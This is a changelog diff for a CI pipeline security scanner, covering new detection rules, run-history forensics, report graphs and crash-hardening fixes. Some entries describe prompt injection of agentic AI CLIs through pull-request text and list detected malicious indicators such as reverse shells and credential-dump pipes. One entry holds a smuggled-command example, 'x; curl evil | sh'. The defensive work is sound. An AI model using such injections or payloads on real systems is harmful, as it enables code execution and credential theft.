@@ -32,6 +32,90 @@ release commit collapses this section into `## [X.Y.Z] - <date>`.
   emits a machine-readable result. (Closes the provenance-verification
   candidate in ROADMAP.)
 
+## [1.12.0] - 2026-06-08
+
+### Added
+
+- **AI / LLM-pipeline rule pack (GitHub).** Two rules for the
+  fastest-growing CI surface, extending the agentic-CLI family
+  (GHA-058/103/104/106/111). **GHA-119** (HIGH) is the AI analog of
+  GHA-003: untrusted context (a PR / issue / comment body, a fork branch
+  name) reaches an agentic CLI's prompt (claude / gemini / cursor-agent /
+  aider / openhands / goose), so a fork PR can smuggle instructions the
+  agent then executes. Crucially it fires even when the value is routed
+  through `env:`, because, unlike a shell, an LLM ingests the env value
+  as prompt text, so the GHA-003 mitigation does not apply. **GHA-120**
+  (HIGH) flags `trust_remote_code=True` / `--trust-remote-code` in a
+  `run:` step: the transformers / huggingface_hub loader executes the
+  model repo's own Python at load time, so an untrusted or unpinned model
+  is arbitrary code execution in CI. The agentic-CLI catalog is now a
+  shared helper (`AGENTIC_CLI_RE`) used by GHA-058 and GHA-119.
+- **Run-history forensics provider (`--pipeline runs`).** A new live-API
+  provider that audits what a repository's GitHub Actions *actually
+  executed*, complementing the static `github` provider's "what could
+  run" analysis. It pulls recent runs via the Actions REST API
+  (`GET /repos/{owner}/{repo}/actions/runs`, reusing the SCM fetcher, so
+  `--gh-token` / `$GITHUB_TOKEN` authenticate it and `--scm-fixture-dir`
+  drives offline tests) and flags: **RUN-001** (HIGH) a fork PR that
+  executed on a privileged trigger (`pull_request_target` /
+  `workflow_run`) — untrusted code that ran with the base repo's secrets,
+  the live shape of the tj-actions/changed-files (CVE-2025-30066) and
+  GhostAction incidents; **RUN-002** (MEDIUM) privileged triggers
+  exercised in the run history (the surface is live in production); and,
+  with the opt-in `--audit-runs-logs` flag, **RUN-003** (HIGH) a secret
+  that leaked into a run's logs (it downloads each privileged-trigger
+  run's log archive and scans it with the shared secret-shape catalog;
+  GitHub masks registered secrets, so a hit is a credential that leaked
+  past masking). A missing token / 404 / network error degrades to a
+  warning rather than crashing. Usage:
+  `pipeline_check --pipeline runs --scm-repo owner/name [--audit-runs-logs]`.
+- **GCB-027: Cloud Build config contains indicators of malicious activity
+  (CRITICAL).** Flags specific compromise evidence (reverse shells,
+  base64-decoded execution, miner binaries, Discord/Telegram webhooks,
+  credential-dump pipes, audit-erasure commands) in a `cloudbuild.yaml`. The
+  Google Cloud Build analog of GHA-027 / GL-025 / BB-025 / ADO-026 / CC-026,
+  reusing the shared `_malicious` indicator catalog and `yaml_blob_check`.
+  Defaults to LOW confidence; matches inside `example` / `fixture` / `sample`
+  / `demo` / `test` keys are auto-suppressed. cloudbuild 26 -> 27.
+- **DR-017: dangerous shell idiom in a Drone step command (HIGH).** Flags
+  `eval "$VAR"` / `sh -c "$VAR"` / backtick exec in a step's `commands:`,
+  completing the dangerous-shell-idiom family across every CI provider
+  (GHA-028 / GL-026 / BB-026 / ADO-027 / CC-027 / BK-016). Reuses the shared
+  `shell_eval` primitive and scans each `commands:` entry on container-flavored
+  pipelines; the `eval "$(ssh-agent -s)"` literal-bootstrap form stays out of
+  scope. drone 16 -> 17.
+- **BK-016: dangerous shell idiom in a Buildkite step command (HIGH).** Flags
+  `eval "$VAR"` / `sh -c "$VAR"` / backtick exec in a step `command:`, the
+  Buildkite analog of GHA-028 / GL-026 / BB-026 / ADO-027 / CC-027 (the one
+  CI provider that still lacked it). Fires on the intrinsically risky idiom
+  regardless of whether the value's source is currently trusted, because the
+  idiom hands the value full shell-grammar reach. Reuses the shared
+  `shell_eval` primitive; the `eval "$(ssh-agent -s)"` literal-bootstrap form
+  is intentionally not flagged. buildkite 16 -> 17.
+- **ADO-033: IaC apply on a PR-validated pipeline (CRITICAL).** Flags an IaC
+  apply command (`terraform apply` / `cloudformation deploy` / `cdk deploy` /
+  `pulumi up` / `sam deploy` / `terragrunt apply`) in a `script:` / `bash:` /
+  `pwsh:` / `powershell:` step (or a task's `inputs.script`) on an Azure
+  DevOps pipeline that opts into PR validation (`pr:` set to anything but
+  `none` / `false`). The PR branch's IaC runs at apply time, so an `external`
+  data source or a `local-exec` provisioner executes arbitrary code on the
+  agent with the service-connection credentials before the change is reviewed.
+  The Azure DevOps analog of GHA-117 / GL-041 / BB-033, reusing the shared
+  `IAC_APPLY_RE` primitive and the `pr:` heuristic from ADO-011 / ADO-019.
+  azure 32 -> 33.
+- **JF-036: shell step interpolates a build parameter (`params.*`) (HIGH).**
+  Flags a `${params.X}` spliced into a double-quoted `sh` / `bat` /
+  `powershell` body. A Jenkins build parameter is set by whoever queues the
+  run (anyone with Build permission, an upstream `build job:` passing
+  `parameters:`, or a webhook trigger); a `string` parameter is free-form
+  text that Groovy substitutes into the command before the shell parses it,
+  so `params.X = "x; curl evil | sh"` runs on the agent in the build's
+  credential context. The Jenkins peer of the GHA `${{ inputs.X }}` and ADO
+  `${{ parameters.X }}` injection rules. Single-quoted Groovy bodies (which
+  don't interpolate) are not flagged. Distinct from JF-002 (SCM env vars),
+  JF-032 (agent labels), and JF-033 (`withCredentials` secret leak); the
+  shared `params.*` taint pattern is now factored into `PARAMS_TAINT_RE`.
+  jenkins 35 -> 36.
 - **BB-033: IaC apply on a pull-request pipeline (CRITICAL).** Flags a
   `terraform apply` / `cloudformation deploy` / `cdk deploy` / `pulumi up` /
   `sam deploy` in a step under Bitbucket's `pull-requests:` section, where
@@ -101,8 +185,127 @@ release commit collapses this section into `## [X.Y.Z] - <date>`.
   via a relationship. No new dependency, the JSON is emitted directly.
   Closes the SPDX format deferred from v1.5.0's build-time SBOM work.
 
+- **TKN-016: remote resolver / bundle taskRef or pipelineRef not pinned
+  (HIGH).** Tekton's Resolution framework fetches the *body* of a Task or
+  Pipeline at run time from a remote source. TKN-001 pins the container
+  image a step runs, but a mutable resolver ref lets whoever controls the
+  upstream swap the executed task body itself. TKN-016 flags a `git`
+  resolver whose `revision` is not a full commit SHA, a `bundles` resolver
+  (or the legacy `taskRef.bundle`) image without an `@sha256:` digest, and
+  a `hub` resolver pinned to `latest` (or no version), across Pipeline
+  `spec.tasks` / `spec.finally`, `PipelineRun.spec.pipelineRef`, and
+  `TaskRun.spec.taskRef`. The `cluster` resolver is not flagged (it
+  references an already-admitted in-cluster object). Mapped across all
+  standards mirroring TKN-001's pinning controls. tekton 16 -> 17.
+
+- **HTML report: step-level pipeline graph for Buildkite (DAG v2).**
+  Extends the step-level DAG to Buildkite pipeline files
+  (`.buildkite/pipeline.yml`). Each command step is a node; `depends_on`
+  (by step `key`) becomes a `needs` edge, and `wait` / `block` / `input`
+  barriers become `stage` edges from every step in the previous wait-group
+  (so the parallel siblings between two barriers carry no false ordering
+  between themselves). `group:` steps flatten their children into the
+  current wait-group, and `trigger:` steps are skipped. A new
+  `checks/buildkite/_graph.py` builder with no contract change, so every
+  other reporter and provider is unchanged.
+- **HTML report: step-level pipeline graph for Azure DevOps (DAG v2).**
+  Extends the step-level DAG to Azure Pipelines (`azure-pipelines.yml`)
+  across all three shapes (flat `steps:`, flat `jobs:`, and
+  `stages:` → `jobs:` → `steps:`). Jobs are nodes with their steps nested
+  (deployment-strategy phases flattened); job `dependsOn` (resolved within
+  its stage) becomes a `needs` edge, and stages sequence via `stage`
+  edges, an explicit stage `dependsOn` when present, otherwise the
+  immediately preceding stage, into each stage's entry jobs (`dependsOn:
+  []` opts out). A new `checks/azure/_graph.py` builder with no contract
+  change.
+- **HTML report: step-level pipeline graph for Bitbucket Pipelines (DAG
+  v2).** Extends the step-level DAG to `bitbucket-pipelines.yml`. Bitbucket
+  ordering is positional (no `depends_on`): sequential steps chain via
+  `stage` edges, a `parallel` block runs its steps concurrently (no edge
+  between siblings, but the next step waits for all of them), and a
+  `stage`'s steps run in sequence. Every pipeline definition in the file
+  (`default` plus the `branches` / `pull-requests` / `custom` / `tags`
+  maps) renders as an independent chain in one graph, so a line-less
+  finding badges a single file root instead of double-counting onto each
+  definition. A new `checks/bitbucket/_graph.py` builder with no contract
+  change.
+- **HTML report: step-level pipeline graph for Jenkins (DAG v2).** Extends
+  the step-level DAG to Jenkinsfiles. Jenkins is Groovy, not YAML, so the
+  builder recovers each `stage('Name') { ... }` block's range from the
+  same depth-aware brace walk the provider already uses, then graphs the
+  top-level stages (a stage not contained in another stage's body) chained
+  sequentially with `stage` edges. Nested stages (the branches of a
+  `parallel { }` block, declarative sub-stages) fold into their enclosing
+  top-level stage rather than inventing edges the flat stage list can't
+  justify. A new `checks/jenkins/_graph.py` builder with no contract
+  change. This completes the DAG-v2 rollout for every YAML/Groovy
+  pipeline provider.
+- **HTML report: step-level pipeline graph for Tekton (DAG v2).** Renders
+  one graph per `Pipeline` document (tasks as nodes, `runAfter` plus
+  implicit `$(tasks.X.results.Y)` data dependencies as `needs` edges) and
+  one per `Task` / `ClusterTask` (steps chained sequentially), bounding
+  each graph's root to its document's line range like the Drone builder.
+  A new `checks/tekton/_graph.py` builder with no contract change.
+- **HTML report: step-level pipeline graph for Argo Workflows (DAG v2).**
+  Renders one graph per template-bearing document (`Workflow` /
+  `WorkflowTemplate` / `ClusterWorkflowTemplate` / `CronWorkflow`) whose
+  nodes are the `spec.templates`; a `dag` template's `tasks[].template` and
+  a `steps` template's `steps[][].template` invocations become `needs`
+  edges (caller to callee), with multi-doc roots bounded like the Drone
+  builder. A new `checks/argo/_graph.py` builder with no contract change.
+  **This completes the DAG-v2 rollout for every pipeline provider.**
+
 ### Changed
 
+- **New-rule contributor friction reduced (internal).** The autodetect /
+  config emitted-set assertions (`test_cli.py`, `test_config.py`) now
+  derive the expected check set from the live registry
+  (`tests/_check_ids.registered_ids`) instead of hand-maintained
+  `range(...)` enumerations, so adding a github / gitlab / bitbucket rule
+  no longer has to bump those lists (and an ID gap can't silently break a
+  contiguous range). The `scripts/new_rule.py` checklist was corrected
+  too: OWASP mapping is flagged MANDATORY (it was wrongly "optional"), the
+  required per-check real-example pair is now listed, and the
+  now-auto-derived sets are noted.
+- **The gate summary clarifies grade vs gate when they disagree.** A
+  strong grade (A or B) sitting on top of a failing gate is the most
+  confusing outcome for a first-time user: the headline reads "Grade A"
+  while the build still exits non-zero. When the gate fails with a high
+  grade, the stderr summary now adds a one-line note that the grade is
+  an overall posture score (checks weighted by severity) while the gate
+  is a separate blocking policy, so a strong grade can still fail on a
+  single blocking finding. A low grade failing the gate is unsurprising,
+  so the note is suppressed there.
+- **`--output json` now lists failing findings only by default.** The JSON
+  `findings` array previously included every passing check too (~100 per
+  file), bloating the report ~50x. It now defaults to failures-only,
+  matching the terminal table and SARIF. The per-severity `passed` /
+  `failed` tallies still live in the `score.summary` block, so the grade and
+  counts are unchanged, and the gate/baseline path (which only reads failing
+  findings) is unaffected. Pass `--show-passed` to restore the full audit
+  record (every check, passed and failed). SARIF stays failures-only and
+  JUnit stays a complete test report, both regardless of the flag. This is a
+  behavior change for JSON consumers that iterated passing findings; they
+  should add `--show-passed`.
+- **Autofix nudge points at the tier that will actually apply the fix.**
+  The terminal "Next ->" footer always suggested `--fix --apply`, but
+  bare `--fix` runs safe fixers only, so for a finding whose only fixer
+  is unsafe-tier (e.g. GHA-003 script-injection) that command modified
+  nothing. The hint now counts the safe-fixable findings for
+  `--fix --apply`, notes the unsafe remainder (`+N via --fix unsafe`),
+  and suggests `--fix unsafe --apply` outright when every available fixer
+  is unsafe.
+- **Best-practice / missing-control rules now default to LOW confidence.**
+  The hygiene family (no timeout, no SBOM, no signing, no SLSA
+  provenance, no vuln-scan step, ~55 rules across providers) is the bulk
+  of the firings on a real repo, and it drowned the active-risk findings.
+  These rules now demote to LOW confidence (the detection is still
+  certain, LOW means low-priority, not likely-false), so the default
+  scan still shows them but `--min-confidence MEDIUM` filters them out
+  for a high-signal view focused on exploitable risk. An explicit
+  per-rule confidence (the curated MEDIUM / LOW lists, or a
+  `confidence_locked` finding) still wins. Scores / grades are unchanged
+  (the scorer weights severity, not confidence).
 - **More hardcoded-credential formats detected.** The shared secret-shape
   catalog (`_patterns.SECRET_DETECTORS`, used by GHA-008 and the
   cross-provider literal-secret rules) gained four modern, high-confidence
@@ -199,80 +402,36 @@ release commit collapses this section into `## [X.Y.Z] - <date>`.
   (code robustness; "leverage" as the security noun); CHANGELOG / ROADMAP
   are exempt as historical records.
 
-### Added
-
-- **TKN-016: remote resolver / bundle taskRef or pipelineRef not pinned
-  (HIGH).** Tekton's Resolution framework fetches the *body* of a Task or
-  Pipeline at run time from a remote source. TKN-001 pins the container
-  image a step runs, but a mutable resolver ref lets whoever controls the
-  upstream swap the executed task body itself. TKN-016 flags a `git`
-  resolver whose `revision` is not a full commit SHA, a `bundles` resolver
-  (or the legacy `taskRef.bundle`) image without an `@sha256:` digest, and
-  a `hub` resolver pinned to `latest` (or no version), across Pipeline
-  `spec.tasks` / `spec.finally`, `PipelineRun.spec.pipelineRef`, and
-  `TaskRun.spec.taskRef`. The `cluster` resolver is not flagged (it
-  references an already-admitted in-cluster object). Mapped across all
-  standards mirroring TKN-001's pinning controls. tekton 16 -> 17.
-
-- **HTML report: step-level pipeline graph for Buildkite (DAG v2).**
-  Extends the step-level DAG to Buildkite pipeline files
-  (`.buildkite/pipeline.yml`). Each command step is a node; `depends_on`
-  (by step `key`) becomes a `needs` edge, and `wait` / `block` / `input`
-  barriers become `stage` edges from every step in the previous wait-group
-  (so the parallel siblings between two barriers carry no false ordering
-  between themselves). `group:` steps flatten their children into the
-  current wait-group, and `trigger:` steps are skipped. A new
-  `checks/buildkite/_graph.py` builder with no contract change, so every
-  other reporter and provider is unchanged.
-- **HTML report: step-level pipeline graph for Azure DevOps (DAG v2).**
-  Extends the step-level DAG to Azure Pipelines (`azure-pipelines.yml`)
-  across all three shapes (flat `steps:`, flat `jobs:`, and
-  `stages:` → `jobs:` → `steps:`). Jobs are nodes with their steps nested
-  (deployment-strategy phases flattened); job `dependsOn` (resolved within
-  its stage) becomes a `needs` edge, and stages sequence via `stage`
-  edges, an explicit stage `dependsOn` when present, otherwise the
-  immediately preceding stage, into each stage's entry jobs (`dependsOn:
-  []` opts out). A new `checks/azure/_graph.py` builder with no contract
-  change.
-- **HTML report: step-level pipeline graph for Bitbucket Pipelines (DAG
-  v2).** Extends the step-level DAG to `bitbucket-pipelines.yml`. Bitbucket
-  ordering is positional (no `depends_on`): sequential steps chain via
-  `stage` edges, a `parallel` block runs its steps concurrently (no edge
-  between siblings, but the next step waits for all of them), and a
-  `stage`'s steps run in sequence. Every pipeline definition in the file
-  (`default` plus the `branches` / `pull-requests` / `custom` / `tags`
-  maps) renders as an independent chain in one graph, so a line-less
-  finding badges a single file root instead of double-counting onto each
-  definition. A new `checks/bitbucket/_graph.py` builder with no contract
-  change.
-- **HTML report: step-level pipeline graph for Jenkins (DAG v2).** Extends
-  the step-level DAG to Jenkinsfiles. Jenkins is Groovy, not YAML, so the
-  builder recovers each `stage('Name') { ... }` block's range from the
-  same depth-aware brace walk the provider already uses, then graphs the
-  top-level stages (a stage not contained in another stage's body) chained
-  sequentially with `stage` edges. Nested stages (the branches of a
-  `parallel { }` block, declarative sub-stages) fold into their enclosing
-  top-level stage rather than inventing edges the flat stage list can't
-  justify. A new `checks/jenkins/_graph.py` builder with no contract
-  change. This completes the DAG-v2 rollout for every YAML/Groovy
-  pipeline provider.
-- **HTML report: step-level pipeline graph for Tekton (DAG v2).** Renders
-  one graph per `Pipeline` document (tasks as nodes, `runAfter` plus
-  implicit `$(tasks.X.results.Y)` data dependencies as `needs` edges) and
-  one per `Task` / `ClusterTask` (steps chained sequentially), bounding
-  each graph's root to its document's line range like the Drone builder.
-  A new `checks/tekton/_graph.py` builder with no contract change.
-- **HTML report: step-level pipeline graph for Argo Workflows (DAG v2).**
-  Renders one graph per template-bearing document (`Workflow` /
-  `WorkflowTemplate` / `ClusterWorkflowTemplate` / `CronWorkflow`) whose
-  nodes are the `spec.templates`; a `dag` template's `tasks[].template` and
-  a `steps` template's `steps[][].template` invocations become `needs`
-  edges (caller to callee), with multi-doc roots bounded like the Drone
-  builder. A new `checks/argo/_graph.py` builder with no contract change.
-  **This completes the DAG-v2 rollout for every pipeline provider.**
-
 ### Fixed
 
+- **Loader hardening sweep: pathological scanned inputs degrade across
+  every format, not just YAML.** Extending the deeply-nested-YAML fix to
+  the whole loader surface, an audit found the same `RecursionError` /
+  `MemoryError` gap (the builtin slips past a parser's
+  `except json.JSONDecodeError` / `except tomllib.TOMLDecodeError` /
+  `except yaml.YAMLError`) in ~21 context-build loaders that run before
+  the per-check guard, so a malformed or pathologically deep repo file
+  could abort the whole scan with a raw traceback. Hardened the JSON
+  loaders (CloudFormation templates, Terraform plans, OCI manifests +
+  attestations, npm `package.json` / lockfiles, Composer, devenv JSONC,
+  the SARIF `--ingest` parser, FP-annotation and baseline readers), the
+  TOML loaders (Cargo, the Gradle version catalog, config files), and the
+  GitLab `include:` resolvers, plus the Terraform plan reader (which had
+  no error handling at all). A new `tests/test_loader_robustness.py`
+  fuzz + differential harness drives every loader with a deterministic
+  battery (deep nesting, alias bombs, non-UTF-8 bytes, truncation, wrong
+  top-level type, empty) and asserts the scan degrades rather than
+  crashes, so a future loader can't reintroduce the gap.
+- **A deeply-nested YAML file no longer crashes the scan.** PyYAML's
+  parser is recursive, so a pathologically deep document (>= ~327 levels
+  of nesting) raised a `RecursionError` straight out of the loader during
+  context construction, before the per-rule guard, aborting the whole
+  scan with a raw traceback. A scanned PR could weaponize this. The
+  shared YAML loaders (`load_yaml_files` plus the kubernetes,
+  cloudformation, and helm parse paths) now treat `RecursionError` /
+  `MemoryError` like a parse failure and skip the file with a warning,
+  the same degrade-don't-crash behavior the malformed-input hardening
+  established. JSON-based and Dockerfile providers were never affected.
 - **Insecure package-install detection widened (cross-provider).** The
   shared `PKG_INSECURE_RE` (the `*-018` insecure-package-source rules across
   GitHub, GitLab, Azure, Bitbucket, CircleCI, Jenkins, plus the Argo /
@@ -383,6 +542,77 @@ release commit collapses this section into `## [X.Y.Z] - <date>`.
   binding, K8S-044 admission webhook). Detection, severity, and finding
   counts are unchanged. The remaining document-level Tekton / Argo rules
   are tracked as the next batch.
+- **A crashing rule no longer aborts the whole scan.** Rules run over
+  config the scanner didn't author, and a single rule tripping over an
+  unexpected YAML shape used to raise straight out of the orchestrator and
+  kill the scan (no findings, non-zero exit). A scanned PR could weaponize
+  this: one malformed workflow file suppressed every finding. `discover_rules`
+  now wraps each check so an unhandled exception degrades to a logged warning
+  plus a passing finding, and the scanner loop guards provider context
+  construction (e.g. a malformed Terraform plan) so one provider's failure
+  doesn't drop the others in a multi-provider run. The AWS / GCP / Azure /
+  CloudFormation / Terraform orchestrators `extend` a `list[Finding]` from
+  each check; their call sites now normalize the guard's single-finding
+  degrade through `as_finding_list` so a lone crashing rule degrades to one
+  finding instead of raising `TypeError` and dropping the whole provider.
+- **GHA-002 / GHA-003 / GHA-004 / GHA-011 crashes on malformed workflows.**
+  GHA-002 and GHA-004 raised `AttributeError` on a scalar `with:` block
+  (`with: ref` instead of a mapping); GHA-003 raised `re.error` when an
+  `env:` key contained a regex metacharacter (the env-var name was
+  interpolated into a pattern without `re.escape`, unlike its sibling rules);
+  GHA-011 raised `TypeError` on a numeric `key:` (`key: 123`). All four now
+  handle the off-shape input instead of crashing.
+- **Autofix no longer writes a duplicate mapping key.** When a sibling key
+  (`name:`, `if:`) sat between `uses:`/`run:` and the `with:`/`env:` block,
+  the GHA-002 and GHA-003 fixers inserted a *second* `with:`/`env:` mapping
+  instead of merging into the existing one. The round-trip safety gate used a
+  lenient loader (last-wins) that accepted the corruption, so it reached disk
+  under `--fix --apply` and silently dropped the original value. The fixers
+  now merge correctly, and the gate uses the strict duplicate-key loader so
+  any future duplicate-emitting fixer bails to "no patch" instead of
+  corrupting the file.
+- **OSV fetcher crash on null fields (`--resolve-remote`).** A vulnerability
+  record with an explicit `"aliases": null` or `"severity": null` raised
+  `TypeError` (`dict.get(key, default)` only substitutes the default for a
+  *missing* key, not a present-but-null one). Both are now treated as empty.
+- **Maven POM parsing hardened against entity-expansion DoS.** `pom.xml` /
+  `settings.xml` were parsed with stdlib ElementTree and no size guard
+  (unlike the NuGet loader). A crafted `<!DOCTYPE>` with nested `<!ENTITY>`
+  definitions (a "billion laughs" payload) could exhaust memory. POM bodies
+  carrying a DTD, or above a ~10M-character cap, are now refused
+  (`parsed_ok=False`) before parsing; a POM never legitimately needs a DTD.
+- **SARIF regions no longer omit `startLine`.** A `Location` can carry a
+  column or end position without a start line; the region builder emitted
+  `startColumn` / `endLine` / `endColumn` with no `startLine`, which GitHub
+  code scanning rejects as invalid. The column/end fields are now emitted
+  only alongside a `startLine`; a column-only location degrades to a
+  file-level result.
+- **JUnit XML strips XML-forbidden control characters.** A finding field
+  carrying a C0 control byte (a NUL or similar lifted from scanned file
+  content) passed through `saxutils` unescaped and produced non-well-formed
+  XML that CI ingestors reject. Control characters (except tab / LF / CR)
+  are now stripped before escaping.
+- **Non-UTF-8 config / ignore / repo-list files no longer crash the run.**
+  The config loaders (`.pipeline-check.*` and the `pyproject.toml` section),
+  both ignore-file loaders (flat + YAML), the inline-ignore scanner, the gate
+  baseline loader, and the fleet `--repos` loader caught `OSError` but not
+  `UnicodeDecodeError` (a `ValueError`), so a latin-1 / cp1252 file aborted
+  the process with a traceback before scanning. These reads now degrade
+  cleanly (skip the file with a warning, or raise a usage error). Because
+  these run outside the per-rule guard, the crash was process-fatal.
+- **Report writes to a bad `--output-file` give a clean error.** Writing
+  JSON / SARIF / JUnit / HTML / etc. to a directory path, a missing parent
+  directory, or a read-only destination raised a raw `OSError`; it is now a
+  `click.UsageError`. Unbalanced quotes in `fleet --scan-flags` likewise
+  surface as a usage error instead of a `shlex` traceback.
+- **`.get(key, default)` null-value crashes.** Several sites relied on a
+  two-arg `.get` defaulting a *missing* key, but an explicit `null` returns
+  None and crashed: the OSV fetcher on a non-object JSON response
+  (`--resolve-remote`), and the CloudFormation S3-005 / ECR-003 policy checks
+  on a `"Statement": null` (which silently disabled those public-access
+  checks via the per-rule guard). The SCM loader's GitLab `repository_size`
+  coercion and the Argo CD `ApplicationSet` source walk are likewise guarded
+  against a non-numeric value and a list-shaped `spec:`.
 
 ## [1.11.0] - 2026-06-06
 
